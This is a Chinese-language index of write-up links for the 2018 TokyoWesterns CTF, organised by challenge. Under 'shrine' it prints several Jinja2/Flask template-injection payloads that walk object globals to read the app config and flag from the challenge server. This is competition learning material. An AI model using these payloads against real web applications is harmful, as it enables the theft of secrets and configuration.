比赛时间：2018/09/01 01:00:00 UTC — 2018/09/03 01:00:00 UTC

比赛地址：https://score.ctf.westerns.tokyo/

### Writeup

- **scs7** 

  https://ctftime.org/writeup/10861 by hackstreetboys

  https://github.com/OAlienO/CTF/tree/master/2018/TokyoWesterns-CTF-4th/scs7

- **pysandbox** 

  https://ctftime.org/writeup/10857 by hackstreetboys

  https://ctftime.org/writeup/10852 by DoubleSigma

  https://github.com/pberba/ctf-solutions/tree/master/20180901_tokyo_western/pysandbox 

  https://github.com/OAlienO/CTF/tree/master/2018/TokyoWesterns-CTF-4th/pysandbox

- **vimshell** 

  https://ctftime.org/writeup/10860 by Lorem Checksum

  https://ctftime.org/writeup/10859 by Lattice

  https://ctftime.org/writeup/10854 by DoubleSigma

- **shrine** 

  几种payload：

  ```bash
  curl -g "http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}"
  ```

  ```http
  http://shrine.chal.ctf.westerns.tokyo/shrine/{{session.__class__.__base__.get.__globals__['warnings']['sys']['modules']['app'].__dict__['app'].__dict__}}
  ```

  ```http
  http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.__class__.__dict__['_load_form_data'].__globals__['current_app'].config}}
  ```
  ```http
  http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__['current_app'].config['FLAG']}}
  ```

  ```http
  http://shrine.chal.ctf.westerns.tokyo/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
  ```

  https://ctftime.org/writeup/10851 by DoubleSigma

  https://ctftime.org/writeup/10895 by PwnaSonic

- **SimpleAuth** 

  https://fireshellsecurity.team/simpleauth/ 

  https://ctftime.org/writeup/10876 by E-Toolz

  https://ctftime.org/writeup/10891 by PwnaSonic

- **load** 

  https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/

  https://github.com/OAlienO/CTF/tree/master/2018/TokyoWesterns-CTF-4th/scs7 

  https://gitlab.com/telnet/CTF-2018/blob/master/twctf/load/README.md

  https://ctftime.org/writeup/10863 

- **Swap Returns** 

  https://ctftime.org/writeup/10864 by 10sec

  https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-swap-returns-pwn/

  https://gitlab.com/snippets/1750518

- **BBQ** 

  https://changochen.github.io/2018/09/01/Tokyo-Western_CTF-2018/

- **Revolutional Secure Angou** 

  https://4rch4ngel6320.wordpress.com/2018/09/03/revolutional-secure-angou-writeup/

  https://ctftime.org/writeup/10867

  https://ctftime.org/writeup/10865

  https://ctftime.org/writeup/10862

  https://ctftime.org/writeup/10850

- **mixed cipher** 

  https://github.com/GabiTulba/Tokyo-Westerns-2018-Mixed-Cipher-Crypto-Write-up/blob/master/README.md

  https://github.com/OAlienO/CTF/tree/master/2018/TokyoWesterns-CTF-4th/mixed-cipher

- **Neighbor C** 

  https://ctftime.org/writeup/10873 by OpenToAll

- **EscapeMe** 

  [TokyoWesterns CTF 2018 - pwn240+300+300 EscapeMe](https://david942j.blogspot.com/2018/09/write-up-tokyowesterns-ctf-2018.html) 

- **dec dec dec**

  https://github.com/ccowmu/ctf_2018/tree/master/writeups/TokyoCTF2018/dec-dec-dec 

- **Matrix LED**

  https://github.com/p4-team/ctf/tree/master/2018-09-01-tokyowesterns/matrix_led 

- **其他**：

  [Revolutional Secure Angou](https://ctftime.org/writeup/10862) by SealTeam1

  [Tokyo Western CTF 2018 (Qualification Round) Hints for some Crypto challenges](https://github.com/nguyenduyhieukma/CTF-Writeups/tree/master/Tokyo%20Western%20CTF/2018) 

  [TokyoWesterns CTF 4th 2018 - Write-ups](https://rawsec.ml/en/Tokyo-Westerns-2018-write-ups/) 

